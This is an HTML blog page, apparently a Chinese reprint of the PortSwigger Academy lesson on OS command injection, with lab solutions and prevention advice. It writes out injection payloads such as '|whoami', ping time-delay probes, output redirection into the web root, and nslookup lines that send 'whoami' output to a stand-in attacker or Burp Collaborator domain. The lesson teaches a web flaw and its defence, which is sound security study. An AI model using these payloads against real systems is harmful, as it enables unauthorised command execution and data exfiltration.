@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    
+    <title>PortSwigger Academy | OS command injection 操作系统命令注入 | 氕氘氚</title>
+    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
+    <meta name="HandheldFriendly" content="True"/>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="google-site-verification" content=""/>
+    <meta name="baidu-site-verification" content=""/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="PortSwigger Academy | OS command injection : 操作系统命令注入 本文转自en0_0 并作补充  总结  &amp;name&#x3D;1&amp;email&#x3D;1%401.com||ping+-c+10+127.0.0.1||&amp;subject&#x3D;1 有时候需要url编码  productId&#x3D;1&amp;storeId&#x3D;1|whoami POST方法不能用&amp;a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PortSwigger Academy | OS command injection 操作系统命令注入">
+<meta property="og:url" content="http://example.com/2023/12/07/OS-Command-Injection/index.html">
+<meta property="og:site_name" content="氕氘氚">
+<meta property="og:description" content="PortSwigger Academy | OS command injection : 操作系统命令注入 本文转自en0_0 并作补充  总结  &amp;name&#x3D;1&amp;email&#x3D;1%401.com||ping+-c+10+127.0.0.1||&amp;subject&#x3D;1 有时候需要url编码  productId&#x3D;1&amp;storeId&#x3D;1|whoami POST方法不能用&amp;a">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/2023/12/07/OS-Command-Injection/1.png">
+<meta property="og:image" content="http://example.com/2023/12/07/OS-Command-Injection/2.png">
+<meta property="og:image" content="http://example.com/2023/12/07/OS-Command-Injection/3.png">
+<meta property="og:image" content="http://example.com/2023/12/07/OS-Command-Injection/4.png">
+<meta property="og:image" content="http://example.com/2023/12/07/OS-Command-Injection/5.png">
+<meta property="og:image" content="http://example.com/2023/12/07/OS-Command-Injection/6.png">
+<meta property="article:published_time" content="2023-12-07T05:09:25.000Z">
+<meta property="article:modified_time" content="2024-01-26T06:29:07.433Z">
+<meta property="article:author" content="Szczecin">
+<meta property="article:tag" content="Exploit">
+<meta property="article:tag" content="Reprint">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/12/07/OS-Command-Injection/1.png">
+    
+
+    <!-- Favicon -->
+    
+        <link rel="icon" href="/img/favicon.ico" />
+    
+
+    <!-- Font -->
+    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">
+
+    
+<link rel="stylesheet" href="/style.css">
+
+    <script>
+      function setLoadingBarProgress(num) {
+        document.getElementById('loading-bar').style.width = num + "%";
+      }
+    </script>
+
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+
+<script>setLoadingBarProgress(20)</script>
+
+<div id="site-wrapper">
+
+    <header id="header">
+    <div id="header-wrapper" class="clearfix">
+        <a id="logo" href="/">
+            <img src="/img/logo.png"/>
+            <span id="site-desc">
+                Be A Gorgeous World
+            </span>
+        </a>
+        <button id="site-nav-switch">
+            <span class="icon icon-menu"></span>
+        </button>
+    </div>
+</header>
+    <script>setLoadingBarProgress(40);</script>
+
+    <main id="main" role="main">
+        <article id="post-OS-Command-Injection"
+         class="post article white-box article-type-post"
+         itemscope itemprop="blogPost">
+    <h2 class="title">
+        <a href="/2023/12/07/OS-Command-Injection/">
+            PortSwigger Academy | OS command injection 操作系统命令注入
+        </a>
+    </h2>
+    <time>
+        Dec 7, 2023
+    </time>
+    <section class="content">
+        <div class="article-entry" itemprop="articleBody">
+            <h1><span id="portswigger-academy-os-command-injection-操作系统命令注入">PortSwigger Academy | OS command injection : 操作系统命令注入</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42942594/article/details/112474186">en0_0</a> 并作补充</p>
+</blockquote>
+<h2><span id="总结">总结</span></h2><blockquote>
+<ul>
+<li><p><code>&amp;name=1&amp;email=1%401.com||ping+-c+10+127.0.0.1||&amp;subject=1</code> 有时候需要url编码</p>
+</li>
+<li><p><code>productId=1&amp;storeId=1|whoami</code> POST方法不能用<code>&amp;</code></p>
+<p>在本节中，我们将解释什么是OS命令注入，描述如何检测和利用漏洞，为不同的操作系统拼写一些有用的命令和技术，并总结如何防止OS命令注入。</p>
+<p><img src="/2023/12/07/OS-Command-Injection/1.png" alt="image"></p>
+</li>
+</ul>
+</blockquote>
+<h2><span id="什么是os命令注入">什么是OS命令注入？</span></h2><blockquote>
+<p>操作系统命令注入（也称为外壳程序注入）是一个Web安全漏洞，它使攻击者可以在运行应用程序的服务器上执行任意操作系统（OS）命令，并且通常会完全破坏该应用程序及其所有数据。 攻击者通常可以利用OS命令注入漏洞来破坏托管基础结构的其他部分，利用信任关系将攻击转移到组织内的其他系统。</p>
+</blockquote>
+<h2><span id="执行任意命令">执行任意命令</span></h2><blockquote>
+<p>考虑一个购物应用程序，该应用程序使用户可以查看特定商店中某商品是否有库存。 该信息可通过如下网址访问：</p>
+<p><code>https://insecure-website.com/stockStatus?productID=381&amp;storeID=29</code></p>
+<p>为了提供库存信息，应用程序必须查询各种旧系统。 由于历史原因，该功能是通过使用产品和存储ID作为参数调用shell命令来实现的：</p>
+<p><code>stockreport.pl 381 29</code><br>此命令输出指定项目的库存状态，并返回给用户。</p>
+<p>由于该应用程序无法防御OS命令注入，因此攻击者可以提交以下输入以执行任意命令：</p>
+<p><code>&amp; echo aiwefwlguh &amp;</code></p>
+<p>如果此输入是在productID参数中提交的，那么应用程序执行的命令是：</p>
+<p><code>stockreport.pl &amp; echo aiwefwlguh &amp; 29</code></p>
+<p>echo命令只是使提供的字符串在输出中回显，并且是测试某些类型的OS命令注入的有用方法。 &amp; 字符是shell命令分隔符，因此执行的实际上是一个接一个的三个独立命令。 结果，返回给用户的输出为：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Error - productID was not provided</span><br><span class="line">aiwefwlguh</span><br><span class="line">29: command not found</span><br></pre></td></tr></table></figure>
+
+<p>输出的三行表明：</p>
+<p>原始的stockreport.pl命令在没有预期参数的情况下执行，因此返回了错误消息。</p>
+<p>执行注入的echo命令，并且在输出中回显提供的字符串。</p>
+<p>原始参数29作为命令执行，从而导致错误。</p>
+<p>通常，将附加命令分隔符&amp;放置在注入命令之后是很有用的，因为这会将注入命令与注入点后面的内容分开。 这减少了随后发生的事件阻止注入的命令执行的可能性。</p>
+</blockquote>
+<h4><span id="lab-os-command-injection-simple-case">Lab: OS command injection, simple case</span></h4><blockquote>
+<p><code>productId=1&amp;storeId=1|whoami</code></p>
+<p><img src="/2023/12/07/OS-Command-Injection/2.png" alt="image"></p>
+</blockquote>
+<h3><span id="有用的命令">有用的命令</span></h3><blockquote>
+<p>当您确定了OS命令注入漏洞后，通常可以执行一些初始命令来获取有关您受到破坏的系统的信息。 以下是在Linux和Windows平台上有用的一些命令的摘要：</p>
+<table>
+<thead>
+<tr>
+<th>命令目的</th>
+<th>Linux</th>
+<th>Windows</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>当前用户的名称</td>
+<td>whoami</td>
+<td>whoami</td>
+</tr>
+<tr>
+<td>操作系统</td>
+<td>uname -a</td>
+<td>ver</td>
+</tr>
+<tr>
+<td>网络配置</td>
+<td>ifconfig</td>
+<td>ipconfig &#x2F; all</td>
+</tr>
+<tr>
+<td>网络连接</td>
+<td>netstat -an</td>
+<td>netstat -an</td>
+</tr>
+<tr>
+<td>运行进程</td>
+<td>ps -ef</td>
+<td>tasklist</td>
+</tr>
+</tbody></table>
+</blockquote>
+<h2><span id="操作系统命令注入漏洞盲注">操作系统命令注入漏洞盲注</span></h2><blockquote>
+<p>OS命令注入的许多实例都是盲注的漏洞。 这意味着应用程序不会在其HTTP响应中返回命令的输出。 盲注漏洞仍然可以被利用，但是需要不同的技术。</p>
+<p>考虑一个允许用户提交有关该站点的反馈的网站。 用户输入他们的电子邮件地址和反馈消息。 然后，服务器端应用程序会向站点管理员生成一封包含反馈的电子邮件。 为此，它使用提交的详细信息调出邮件程序。 例如：</p>
+<p><code>mail -s &quot;This site is great&quot; -aFrom:peter@normal-user.net feedback@vulnerable-website.com</code></p>
+<p>mail命令的输出（如果有）不会在应用程序的响应中返回，因此使用echo有效负载将无效。 在这种情况下，您可以使用多种其他技术来检测和利用漏洞。</p>
+</blockquote>
+<h3><span id="使用时间延迟检测盲注os命令注入">使用时间延迟检测盲注OS命令注入</span></h3><blockquote>
+<p>您可以使用注入的命令来触发时间延迟，从而允许您根据应用程序响应的时间来确认命令已执行。 ping命令是执行此操作的有效方法，因为它使您可以指定要发送的ICMP数据包的数量，从而指定该命令运行所花费的时间：</p>
+<p><code>&amp; ping -c 10 127.0.0.1 &amp;</code></p>
+<p>此命令将导致应用程序ping其环回网络适配器10秒钟。</p>
+</blockquote>
+<h4><span id="lab-blind-os-command-injection-with-time-delays">Lab: Blind OS command injection with time delays</span></h4><blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csrf=j25Ci6owysrme8z4HvkicgC1hqXWr0Yz&amp;name=1&amp;email=1%401.com||ping+-c+10+127.0.0.1||&amp;subject=1&amp;message=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/07/OS-Command-Injection/3.png" alt="image"></p>
+</blockquote>
+<h3><span id="通过重定向输出来利用盲注os命令注入">通过重定向输出来利用盲注OS命令注入</span></h3><blockquote>
+<p>您可以将注入命令的输出重定向到Web根目录下的文件中，然后可以使用浏览器进行检索。 例如，如果应用程序从文件系统位置&#x2F;var&#x2F;www&#x2F;static提供静态资源，则可以提交以下输入：</p>
+<p><code>&amp; whoami&gt; /var/www/static/whoami.txt &amp;</code></p>
+<p><code>&gt;</code>字符将whoami命令的输出发送到指定文件。 然后，您可以使用浏览器获取<a target="_blank" rel="noopener" href="https://vulnerable-website.com/whoami.txt%E6%9D%A5%E6%A3%80%E7%B4%A2%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E7%9A%84%E8%BE%93%E5%87%BA%E3%80%82">https://vulnerable-website.com/whoami.txt来检索文件，并查看注入命令的输出。</a></p>
+</blockquote>
+<h4><span id="lab-blind-os-command-injection-with-output-redirection">Lab: Blind OS command injection with output redirection</span></h4><blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;email=1%401.com||whoami+&gt;+/var/www/images/whoami.txt||&amp;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/07/OS-Command-Injection/4.png" alt="image"></p>
+</blockquote>
+<h3><span id="利用带外oast技术利用盲目的os命令注入">利用带外（OAST）技术利用盲目的OS命令注入</span></h3><blockquote>
+<p>您可以使用注入的命令，通过OAST技术触发与您控制的系统的带外网络交互。 例如：</p>
+<p><code>&amp; nslookup kgji2ohoyw.web-attacker.com &amp;</code></p>
+<p>此有效负载使用nslookup命令对指定的域进行DNS查找。 攻击者可以监视是否发生了指定的查找，从而检测到命令已成功注入。</p>
+</blockquote>
+<h4><span id="lab-blind-os-command-injection-with-out-of-band-interaction">Lab: Blind OS command injection with out-of-band interaction</span></h4><blockquote>
+<p><img src="/2023/12/07/OS-Command-Injection/5.png" alt="image"></p>
+<p>带外通道还提供了一种从注入的命令中提取输出的简便方法：<br> (根本别啥用)</p>
+<p><code>&amp; nslookup </code>whoami<code>.kgji2ohoyw.web-attacker.com &amp;</code></p>
+<p>这将导致对DNS的攻击者所在域进行域名查询，其中包含whoami命令的结果：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wwwuser.kgji2ohoyw.web-attacker.com</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4><span id="lab-blind-os-command-injection-with-out-of-band-data-exfiltration">Lab: Blind OS command injection with out-of-band data exfiltration</span></h4><blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=1%401.com||nslookup+`whoami`.132kftea48t801xjselcncwfp6vwjl.burpcollaborator.net||</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/07/OS-Command-Injection/6.png" alt="image"></p>
+</blockquote>
+<h2><span id="注入os命令的方式">注入OS命令的方式</span></h2><blockquote>
+<p>各种shell字符可用于执行OS命令注入攻击。</p>
+<p>许多字符用作命令分隔符，使命令可以链接在一起。 以下命令分隔符可在基于Windows和Unix的系统上运行：</p>
+<pre><code>&amp;
+&amp;&amp;
+|
+||
+</code></pre>
+<p>以下命令分隔符仅在基于Unix的系统上起作用：</p>
+<pre><code>;
+Newline (0x0a or \n)
+</code></pre>
+<p>在基于Unix的系统上，您还可以使用反引号或美元字符在原始命令中内嵌执行注入命令： （原来如此，windows不能用反引号）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`injected-command`</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">( injected-command )</span></span><br></pre></td></tr></table></figure>
+
+<p>请注意，不同的shell元字符具有细微不同的行为，这些行为可能会影响它们是否在某些情况下起作用，以及它们是否允许带内检索命令输出或仅对盲注使用有用。</p>
+<p>有时，您控制的输入会出现在原始命令的引号中。 在这种情况下，需要先使用引号终止上下文（使用”或’），然后再使用适当的外壳元字符来插入新命令。</p>
+</blockquote>
+<h2><span id="如何防止os命令注入攻击">如何防止OS命令注入攻击</span></h2><blockquote>
+<p>到目前为止，防止OS命令注入漏洞的最有效方法是永远不要从应用程序层代码中调用OS命令。 几乎在每种情况下，都有使用更安全的平台API来实现所需功能的替代方法。</p>
+<p>如果认为无法通过用户提供的输入调出OS命令，则必须执行强大的输入验证。 有效验证的一些示例包括：</p>
+<ul>
+<li>根据 允许值 的白名单进行验证。</li>
+<li>验证输入是否为数字。</li>
+<li>验证输入仅包含字母数字字符，不包含其他语法或空格。</li>
+</ul>
+<p>切勿尝试通过转义shell元字符来清理输入。 实际上，这太容易出错，容易被熟练的攻击者绕开。</p>
+</blockquote>
+
+        </div>
+        <div class="article-tags tags">
+            
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            
+        </div>
+    </section>
+</article>
+
+
+
+
+
+        <script>setLoadingBarProgress(60);</script>
+    </main>
+
+    <footer id="footer" class="clearfix">
+
+    
+
+    <div class="social-wrapper">
+        
+            
+                <a href="https://github.com/artchen" class="social github"
+                   target="_blank" rel="external">
+                    <span class="icon icon-github"></span>
+                </a>
+            
+                <a href="/atom.xml" class="social rss"
+                   target="_blank" rel="external">
+                    <span class="icon icon-rss"></span>
+                </a>
+            
+        
+    </div>
+
+    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
+                                                                                    target="_blank">Art Chen</a>.
+    </div>
+    <div>&copy; <a href="/">氕氘氚</a></div>
+
+</footer>
+
+
+    <script>setLoadingBarProgress(80);</script>
+    <div class="overlay"></div>
+</div>
+
+<div class="site-sidebar" id="site-sidebar">
+
+    
+
+    <div class="sidebar-switch clearfix "
+         style="display: none">
+        <a class="dark-btn active" data-toggle="toc">
+            <span class="icon icon-list"></span>
+            <span class="text">Index</span>
+        </a>
+        <a class="dark-btn" data-toggle="bio">
+            <span class="icon icon-person"></span>
+            <span class="text">Bio</span>
+        </a>
+    </div>
+
+    <div class="site-toc "
+         style="display: none">
+        
+            <div class="no-index">No Index</div>
+        
+    </div>
+
+    <div class="site-bio show"
+         style="display: block">
+
+        <div class="about-me clearfix">
+            <div class="avatar">
+                <img src="/img/avatar.png"/>
+            </div>
+            <div class="info">
+                <a class="name dark-btn" href="/about">
+                    Szczecin
+                </a>
+            </div>
+            <div class="info">
+                <span class="item desc">
+                    Open your eyes to see the light in life
+                </span>
+            </div>
+        </div>
+
+        <div class="menu section">
+            <ul class="clearfix">
+                
+                    <li class="left">
+                        <a href="/about"
+                           onfocus="this.blur();"
+                           class="nav-about dark-btn block">
+                            简介
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/archives"
+                           onfocus="this.blur();"
+                           class="nav-archives dark-btn block">
+                            归档
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/categories"
+                           onfocus="this.blur();"
+                           class="nav-categories dark-btn block">
+                            分类
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/tags"
+                           onfocus="this.blur();"
+                           class="nav-tags dark-btn block">
+                            TAGs
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/WriteUP"
+                           onfocus="this.blur();"
+                           class="nav-WriteUP dark-btn block">
+                            WriteUP
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/EXP"
+                           onfocus="this.blur();"
+                           class="nav-EXP dark-btn block">
+                            EXP
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/SRC"
+                           onfocus="this.blur();"
+                           class="nav-SRC dark-btn block">
+                            SRC
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/Life"
+                           onfocus="this.blur();"
+                           class="nav-Life dark-btn block">
+                            Life
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+
+    </div>
+
+    <div class="shortcuts">
+        <a href="#header" class="top window-nav dark-btn" id="go-top">
+            <span class="icon icon-chevron-thin-up"></span>
+        </a>
+        <a class="close dark-btn" id="sidebar-close">
+            <span class="icon icon-close"></span>
+        </a>
+        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
+            <span class="icon icon-chevron-thin-down"></span>
+        </a>
+    </div>
+
+</div>
+
+
+
+
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>
+
+
+<script src="/js/jquery.fitvids.js"></script>
+
+<script>
+  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+  var ALGOLIA_API_KEY = "";
+  var ALGOLIA_APP_ID = "";
+  var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var SEARCH_SERVICE = "";
+  var universalSearchConfig = {};
+  if (SEARCH_SERVICE === 'google') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
+      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'algolia') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: ALGOLIA_API_KEY,
+      appId: ALGOLIA_APP_ID,
+      indexName: ALGOLIA_INDEX_NAME,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'azure') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      serviceName: AZURE_SERVICE_NAME,
+      indexName: AZURE_INDEX_NAME,
+      apiKey: AZURE_QUERY_KEY,
+      imagePath: "/img/"
+    };
+  }
+</script>
+
+<script src="/js/app.js"></script>
+
+
+<script src="/js/search.js"></script>
+
+
+
+
+
+<script>setLoadingBarProgress(100);</script>
+
+</body>
+</html>
